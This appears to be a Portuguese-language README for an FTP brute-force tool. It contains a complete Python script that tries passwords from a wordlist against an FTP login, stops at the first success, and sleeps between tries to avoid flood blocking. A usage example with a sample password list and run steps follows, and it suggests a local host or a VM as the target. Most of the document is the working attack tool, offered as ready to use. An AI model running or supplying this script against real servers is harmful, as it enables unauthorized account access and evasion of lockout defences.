# ftp_bruteforce
Bruteforce de FTP com Python

from ftplib import FTP
import time

def tentar_login(host, usuario, senha):
    try:
        ftp = FTP()
        ftp.connect(host, 21, timeout=5)
        ftp.login(usuario, senha)
        print(f"[✅] Sucesso: {usuario}:{senha}")
        ftp.quit()
        return True
    except:
        print(f"[❌] Falhou: {usuario}:{senha}")
        return False

def main():
    host = input("Host/IP do servidor FTP: ")
    usuario = input("Usuário: ")
    arquivo_senhas = input("Caminho do arquivo com senhas: ")

    try:
        with open(arquivo_senhas, 'r') as f:
            for linha in f:
                senha = linha.strip()
                if tentar_login(host, usuario, senha):
                    break  # Parar se encontrar a senha
                time.sleep(0.5)  # Evita bloqueio por flood
    except FileNotFoundError:
        print("[!] Arquivo de senhas não encontrado.")

if __name__ == "__main__":
    main()
-------------------------------------------------------------------------------------------------------------------------------
#exemplo de uso

 Exemplo de uso:
Crie um arquivo senhas.txt com senhas para testar:

pgsql
Copy
Edit
123456
admin
senha
ftp123
meusegredo
Execute o script:

bash
Copy
Edit
python bruteforce_ftp.py
Digite:

Host: 127.0.0.1 (ou o IP da VM com FTP ativo)

Usuário: ftpuser

Caminho do arquivo: senhas.txt
